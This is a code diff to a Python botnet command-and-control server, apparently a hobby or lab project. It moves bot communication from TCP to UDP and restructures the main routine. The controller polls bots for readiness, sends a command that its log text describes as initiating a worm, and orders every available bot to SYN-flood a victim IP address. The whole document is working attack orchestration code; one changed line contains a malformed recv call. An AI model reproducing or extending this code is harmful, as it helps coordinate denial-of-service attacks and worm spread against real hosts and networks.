@@ -35,13 +35,13 @@ class Server:
         list of available bots to prepare for an attack.
         """
         logger.info('Retrieving bot availability.')
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.bind(('', PORT))
         self.available = []
 
         for bot in self.bot_list:
             try:
-                sock.connect((bot, PORT))
-                sock.send(COMMANDS[0].encode('utf-8'))
+                sock.sendto(COMMANDS[0].encode('utf-8'), (bot, PORT))
                 data = sock.recv(1024).decode('utf-8')
                 logger.info('Received {} from {}'.format(data, bot))
                 if 'REDY' in data:
@@ -59,12 +59,15 @@ class Server:
         """
         logger.info('Sending ATCK::0 command')
         self.get_state() # Update the available bots
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.bind(('', PORT))
 
         for bot in self.available:
             try:
-                sock.connect((bot, PORT))
-                sock.send(COMMANDS[2].encode('utf-8'))
+                sock.sendto(COMMANDS[2].encode('utf-8'), (bot, PORT))
+                data = sock.recv((1024).decode('utf-8'))
+                logger.info('Received {} from {}'.format(data, bot))
             except Exception as e:
                 logger.info('Failed to connect and init worm for: {}'.format(bot))
                 logger.info('Reason: {}'.format(e))
@@ -78,18 +81,19 @@ class Server:
         """
         logger.info('Init syn flood on: {}'.format(victim_ip))
         self.get_state()
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.bind(('', PORT))
 
         for bot in self.available:
             try:
-                sock.connect((bot, PORT))
                 comm = COMMANDS[3] + victim_ip
-                sock.send(comm.encode('utf-8'))
+                sock.sendto(comm.encode('utf-8'), (bot, PORT))
                 data = sock.recv(1024).decode('utf-8')
                 logger.info("Received: '{}' from {}".format(data, bot))
             except Exception as e:
                 logger.info('Failed to connect and init syn flood for: {}'.format(bot))
                 logger.info('Reason: {}'.format(e))
+
         sock.close()
 
     def stop_atck(self):
@@ -97,12 +101,12 @@ class Server:
         and set their state to 'REDY'.
         """
         logger.info('Stopping all attacks.')
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.bind(('', PORT))
+
         for bot in self.bot_list:
             try:
-                sock.connect((bot, PORT))
-                comm = COMMANDS[4]
-                sock.send(comm.encode('utf-8'))
+                sock.sendto(COMMANDS[4].encode('utf-8'), (bot, PORT))
                 data = sock.recv(1024).decode('utf-8')
                 logger.info('Stopping {}'.format(bot))
                 logger.info("Received '{}' from {}".format(data, bot))
@@ -111,13 +115,19 @@ class Server:
                 logger.info('Reason: {}'.format(e))
         sock.close()
 
-threading.Thread(target=listener).start()
+def main():
+    serv = Server()
 
-serv = Server()
-serv.get_state()
-time.sleep(1)
-serv.atck_1('192.168.0.10')
-time.sleep(1)
-serv.atck_0()
-time.sleep(1)
-serv.stop_atck()
+    serv.get_state() 
+    print('Bot state updated')
+    time.sleep(0.5)
+    serv.atck_1('192.168.0.10')
+    print('Bot atck_1 message sent')
+    time.sleep(0.5)
+    serv.atck_0()
+    print('Bot atck_0 message sent')
+    time.sleep(0.5)
+    serv.stop_atck()
+    print('Bot stop message sent')
+
+#threading.Thread(target=listener).start()
